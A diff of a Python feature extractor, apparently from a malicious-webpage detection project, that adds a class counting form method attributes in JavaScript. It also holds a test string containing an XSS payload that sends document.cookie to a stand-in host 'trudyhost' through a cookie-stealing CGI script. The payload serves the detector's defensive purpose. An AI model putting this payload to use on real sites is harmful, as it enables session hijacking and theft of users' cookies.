@@ -4,12 +4,38 @@ import re
 # post: send via HTTP message body.
 # 有可能inject malicious code into the URLs
 # Q：这好像和JS关系不大？
-"""
+test_str = """
 http://host/personalizedpage.php?username=<script>
 document.location='http://trudyhost/cgi-bin/
 stealcookie.cgi?'
 +document.cookie</script>
 """
+from src.static_features.js import *
+
+
+class FormMethodJS(JSExtractor):
+    def __init__(self, web_data):
+        super().__init__(web_data)
+        self.meta = ExtractorMeta(
+            "js",
+            "FormMethodJS",
+            "InfectedWebContent2017",
+            "form的method属性数量，包括get和post",
+            "1.0",
+        )
+
+    def extract(self) -> FeatureExtractionResult:
+        js_content_list = self.web_data.content["js"]
+        info_dict = {}
+        for h in js_content_list:
+            start_time = time.time()
+            res = extract(h["content"])
+            info_dict[h["filename"]] = {
+                "count": res,
+                "time": time.time() - start_time,
+                "additional_info": {},
+            }
+        return FeatureExtractionResult(self.meta.filetype, self.meta.name, info_dict)
 
 
 def extract(js_content: str):
